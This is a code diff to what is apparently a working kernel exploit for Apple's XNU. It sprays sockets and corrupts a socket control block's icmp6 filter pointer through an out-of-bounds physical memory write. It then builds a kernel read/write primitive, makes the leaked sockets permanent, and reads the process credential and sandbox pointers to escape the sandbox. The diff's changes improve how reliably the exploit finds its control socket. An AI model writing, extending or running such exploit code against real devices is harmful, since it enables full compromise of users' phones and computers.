@@ -161,6 +161,8 @@ mach_vm_address_t pcAddress = 0;
 mach_vm_size_t pcSize;
 
 u64_array_t socketPorts;
+u64_array_t socketPcbIds;
+uint8_t *socketInfoBuf = NULL;
 #define GETSOCKOPT_READ_LEN 32
 void *getsockoptReadData = NULL;
 
@@ -178,12 +180,15 @@ int lseekFails = 0;
 int readFails = 0;
 int markerMatches = 0;
 
+void krw_sockets_leak_forever(void);
 int controlSocket = 0;
 int rwSocket = 0;
 uint64_t controlSocketPcb = 0;
 uint64_t rwSocketPcb = 0;
+uint64_t originalIcmp6Filter = 0;
 #define EARLY_KRW_LENGTH 0x20
 uint8_t controlData[EARLY_KRW_LENGTH];
+
 
 void setTargetKaddr(uint64_t where)
 {
@@ -205,6 +210,7 @@ pthread_t freeThread;
 void init_globals(void)
 {
 	u64_array_init(&socketPorts, 32768);
+	u64_array_init(&socketPcbIds, 32768);
 	getsockoptReadData = calloc(1, GETSOCKOPT_READ_LEN);
 	default_file_content = calloc(1, TARGET_FILE_SIZE);
 	randomMarker         = (uint64_t)arc4random() << 32 | arc4random();
@@ -311,6 +317,13 @@ fileport_t spray_socket(u64_array_t *ports)
 		printf("[-] fileport_makeport failed: %d\n", fpr);
 		return -1;
 	}
+
+	if (!socketInfoBuf) socketInfoBuf = calloc(1, 0x400);
+	memset(socketInfoBuf, 0, 0x400);
+	pid_t real_pid = (pid_t)syscall(20);
+	syscall(336, 6, real_pid, 3, outputSocketPort, socketInfoBuf, 0x400);
+	uint64_t inp_gencnt = *(uint64_t *)(socketInfoBuf + 0x110);
+	u64_array_push(&socketPcbIds, inp_gencnt);
 
 	u64_array_push(ports, (uint64_t)outputSocketPort);
 	return outputSocketPort;
@@ -645,6 +658,25 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		printf("[+] pcbStartOffset: %#llx\n", pcbStartOffset);
 		uint64_t targetInpGencnt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_PCB_GENCNT);
 		printf("[+] targetInpGencnt: %#llx\n", targetInpGencnt);
+
+		// match gencnt against spray to find exact socket index
+		bool isOurPcb = false;
+		int controlSocketIdx = -1;
+		for (int si = 0; si < socketPcbIds.count; si++) {
+			if (socketPcbIds.data[si] == targetInpGencnt) {
+				isOurPcb = true;
+				controlSocketIdx = si;
+				break;
+			}
+		}
+		if (!isOurPcb) {
+			printf("[-] Found freed PCB (gencnt not in spray)\n");
+			return -1;
+		}
+		if (targetInpGencnt == u64_array_last(&socketPcbIds)) {
+			printf("[-] Found last PCB\n");
+			return -1;
+		}
 		if (u64_array_contains(targetInpGencntList, targetInpGencnt)) {
 			printf("[-] Found old PCB Page!!!!\n");
 			return -1;
@@ -654,53 +686,31 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
 		printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);
 		printf("[+] icmp6Filter: %#llx\n", icmp6Filter);
+		originalIcmp6Filter = icmp6Filter;
 		rwSocketPcb = inpListNextPointer;
 		memcpy(writeBuffer, readBuffer, OOB_SIZE);
 		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;
 		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8) = 0;
 
 		printf("[+] Corrupting icmp6filter pointer...\n");
-		bool corrupted = false;
-		for (int corruptTry = 0; corruptTry < 1000; corruptTry++) {
+		while (true) {
 			physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
 			physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
 			uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
 			if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {
-				printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT));
-				corrupted = true;
+				printf("[+] target corrupted: %#llx\n", newIcmp6Filter);
 				break;
 			}
 		}
-		if (!corrupted) {
-			printf("[-] Failed to corrupt icmp6filter after 1000 tries\n");
+		controlSocket = fileport_makefd((fileport_t)socketPorts.data[controlSocketIdx]);
+		rwSocket = fileport_makefd((fileport_t)socketPorts.data[controlSocketIdx + 1]);
+		if (controlSocket < 0 || rwSocket < 0) {
+			printf("[-] fileport_makefd failed: control=%d rw=%d\n", controlSocket, rwSocket);
 			return -1;
 		}
-		for (int controlSocketIdx = 0; controlSocketIdx < socketPorts.count - 1; controlSocketIdx++) {
-			int sock = fileport_makefd((fileport_t)socketPorts.data[controlSocketIdx]);
-			if (sock < 0) continue;
-			socklen_t len = GETSOCKOPT_READ_LEN;
-			int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);
-			if (res != 0) {
-				close(sock);
-				continue;
-			}
-			uint64_t marker = *(uint64_t *)getsockoptReadData;
-			if (marker != (uint64_t)-1) {
-				printf("[+] Found control_socket at idx: %u fd=%d\n", controlSocketIdx, sock);
-				controlSocket = sock;
-				rwSocket = fileport_makefd((fileport_t)socketPorts.data[controlSocketIdx + 1]);
-				printf("[+] rwSocket fd=%d\n", rwSocket);
-				if (rwSocket < 0) {
-					printf("[-] fileport_makefd failed for rwSocket\n");
-					close(controlSocket);
-					controlSocket = 0;
-					continue;
-				}
-				return KERN_SUCCESS;
-			}
-			close(sock);
-		}
-		printf("[-] Failed to find control_socket\n");
+		printf("[+] controlSocket idx=%d fd=%d, rwSocket fd=%d\n", controlSocketIdx, controlSocket, rwSocket);
+		fflush(stdout);
+		return KERN_SUCCESS;
 	}
 	return -1;
 }
@@ -758,6 +768,7 @@ void pe_v1(void)
 			u64_array_push(&searchMappings, searchMappingAddress);
 		}
 		u64_array_reset(&socketPorts);
+		u64_array_reset(&socketPcbIds);
 		unsigned socketPortsCount = 0;
 		#define OPEN_MAX 10240
 		int maxfiles = OPEN_MAX * 3;
@@ -893,19 +904,18 @@ int main(int argc, char* argv[])
 	close(writeFd);
 	close(readFd);
 
-	printf("[i] rwSocketPcb=%#llx\n", rwSocketPcb); fflush(stdout);
-	controlSocketPcb = early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT);
-	printf("[i] controlSocketPcb(raw)=%#llx\n", controlSocketPcb); fflush(stdout);
-	controlSocketPcb = __xpaci(controlSocketPcb);
-	printf("[i] controlSocketPcb=%#llx\n", controlSocketPcb); fflush(stdout);
+	controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
+	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);
+
+	krw_sockets_leak_forever();
+	printf("[+] sockets leaked\n"); fflush(stdout);
+
 	uint64_t socketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
-	printf("[i] socketAddr=%#llx\n", socketAddr); fflush(stdout);
 	uint64_t ucred = early_kread64(socketAddr + OFFSET_SO_CRED);
-	printf("[i] ucred=%#llx\n", ucred); fflush(stdout);
 	uint64_t cr_label = __xpaci(early_kread64(ucred + OFFSET_UCRED_LABEL));
-	printf("[i] cr_label=%#llx\n", cr_label); fflush(stdout);
 	uint64_t sandbox = early_kread64(cr_label + OFFSET_LABEL_SANDBOX);
-	printf("[i] sandbox=%#llx\n", sandbox); fflush(stdout);
+	printf("[i] socketAddr=%#llx ucred=%#llx cr_label=%#llx sandbox=%#llx\n",
+		socketAddr, ucred, cr_label, sandbox); fflush(stdout);
 
 	if (!sandbox) {
 		printf("[+] no sandbox — already unsandboxed\n"); fflush(stdout);
@@ -984,6 +994,5 @@ int main(int argc, char* argv[])
 	}
 
 	printf("[*] DONE\n"); fflush(stdout);
-	while(1) sleep(60);
 	return 0;
 }
